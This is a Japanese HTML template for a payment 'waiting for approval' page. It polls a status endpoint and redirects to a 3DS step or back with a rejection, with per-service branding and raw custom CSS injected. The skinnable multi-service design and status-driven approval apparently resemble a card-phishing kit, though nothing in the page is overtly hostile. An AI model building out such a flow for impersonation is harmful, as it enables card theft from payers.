<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>承認待ち - {{ service.display_name }}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: {{ service.design.font_family }};
            background-color: {{ service.design.background_color }};
            color: {{ service.design.text_color }};
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background-color: {{ service.design.background_color }};
            border: 2px solid {{ service.design.border_color }};
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }

        /* スマホ対応：枠線を削除 */
        @media (max-width: 768px) {
            body {
                padding: 0;
                align-items: flex-start;
            }

            .container {
                border: none;
                padding: 20px;
                max-width: 100%;
                min-height: 100vh;
            }
        }

        h1 {
            font-size: 28px;
            margin-bottom: 30px;
            text-align: center;
            font-weight: bold;
            color: {{ service.design.text_color }};
        }

        .waiting-message {
            text-align: center;
            padding: 40px 20px;
        }

        .waiting-message p {
            font-size: 18px;
            margin-bottom: 30px;
            color: {{ service.design.text_color }};
        }

        .spinner {
            border: 4px solid {{ service.design.secondary_color }};
            border-top: 4px solid {{ service.design.primary_color }};
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* カスタムCSS */
        {{ service.design.custom_css | safe }}
    </style>
</head>
<body>
    <div class="container">
        <h1>認証中・・・</h1>
        <div class="waiting-message">
            <p>カード情報をカード会社に確認中です...</p>
            <div class="spinner"></div>
        </div>
    </div>

    <script>
        const paymentId = "{{ payment_id }}";
        const serviceKey = "{{ service_key }}";
        
        // 2秒ごとに状態をチェック
        const checkStatus = setInterval(async () => {
            try {
                const response = await fetch(`/${serviceKey}/check_status/${paymentId}`);
                const status = await response.json();
                
                if (status.status === 'card_approved') {
                    clearInterval(checkStatus);
                    window.location.href = `/${serviceKey}/3ds`;
                } else if (status.status === 'card_rejected') {
                    clearInterval(checkStatus);
                    // エラーメッセージをURLパラメータで渡す
                    window.location.href = `/${serviceKey}?error=rejected`;
                }
            } catch (error) {
                console.error('状態チェックエラー:', error);
            }
        }, 2000);
    </script>
</body>
</html>
